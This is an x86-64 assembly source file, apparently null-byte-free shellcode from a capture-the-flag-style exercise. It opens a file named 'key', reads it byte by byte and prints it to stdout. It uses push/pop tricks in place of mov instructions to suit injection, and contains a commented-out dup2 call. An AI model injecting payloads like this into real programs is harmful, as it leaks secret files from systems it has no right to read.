bits 64
global _start
section .text
_start:


;open
  push 0x79656b
  push rsp
  pop rdi
  ;mov rdi, rsp
  xor rsi, rsi ; flags = O_RDONLY
  push rsi
  pop rdx
  ;mov rdx, rsi ; mode = NULL
  xor rax, rax
  push 2
  pop rax
  ;mov rax, 2	; = 2
  syscall
  push rax
  pop r15
  ;mov r15, rax
  
  
  ;mov rsi, 1
  ;mov rdi, r13
  ;mov rax, 33 ;dup2
  ;syscall
  ;mov r14, rax
  
loop_in: 
  push r15
  pop rdi
  lea rsi, [rsp-1]
  push 1
  pop rdx
  push 0
  pop rax
  syscall
  
  ; read syscall args
  ;mov rdi, r15 ;fd from open
  ;lea rsi, [rsp-1]
  ;mov rdx, 1
  ;mov rax, 0 
  ;syscall

  ; check for input
  cmp rax, 1
  jne end

loop_out:
  push rax
  pop rdi
  lea rsi, [rsp-1]
  push 1
  pop rdx
  push 1
  pop rax
  syscall


  ; write syscall args
  ;mov rdi, rax ;write to stdout
  ;lea rsi, [rsp-1]
  ;mov rdx, 1
  ;mov rax, 1 
  ;syscall

  cmp rax, 1
  jne end

  jmp loop_in ; start over

end:
  push 0x3c
  pop rax
  syscall


  
